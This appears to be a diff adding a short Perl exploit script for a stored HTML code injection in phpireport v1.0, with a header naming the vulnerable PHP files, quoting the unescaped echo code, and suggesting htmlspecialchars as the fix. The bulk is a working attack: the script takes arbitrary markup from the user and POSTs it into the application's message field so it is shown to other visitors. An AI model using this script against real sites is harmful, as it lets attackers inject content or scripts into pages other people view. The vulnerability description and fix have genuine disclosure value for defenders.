@@ -1,0 +1,42 @@
+#!/usr/bin/perl
+########################################################################
+# Title    = phpireport v1.0 => Remote Html Code injection
+# Author   = Or4nG.M4n
+# Download = http://garr.dl.sourceforge.net/project/phpireport/phpireport%20v1.0%20alpha%20revision%2025.rar
+# Thnks :
+# +----------------------------------+
+# |   xSs m4n   i-Hmx   h311 c0d3    |
+# |   Dr.Bnned ahwak2000 sa^Dev!L    |
+# +----------------------------------+
+#
+#	                                 Html injection 
+# vuln : messages_viewer.php
+# vuln : home.php
+# vuln : history.php
+# code :
+#	
+#	echo "
+#		<li>
+#			<div class='post-details'><div style='float:left'>user: ".stripslashes($name)."</div> <div style='float:right'>".$time."</div></div>
+#			<br>
+#			<div class='post-details'>".stripslashes($message)."</div>
+#		</li>
+#	";
+# How i can Fixed ..
+# in all vuln file 
+# Replace : stripslashes => Replace with => htmlspecialchars
+# Thnks to All Stupid Coders 
+#
+use LWP::UserAgent;
+
+print "Code to inject #";
+my $inj = <STDIN>;
+chomp $inj;
+my $url = 'http://localhost/phpireport/index.php';
+
+my $ua       = LWP::UserAgent->new();
+my $response = $ua->post( $url, { 'message' => $inj } ); # Post <textarea rows='2' name='message' id='name'>&lt;/textarea&gt;
+my $content  = $response->decoded_content();
+print "\n done \n";
+
+# The End
